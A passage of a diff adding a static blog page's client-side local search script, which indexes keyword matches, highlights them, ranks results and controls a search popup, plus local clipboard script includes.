+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+</body>
+</html>
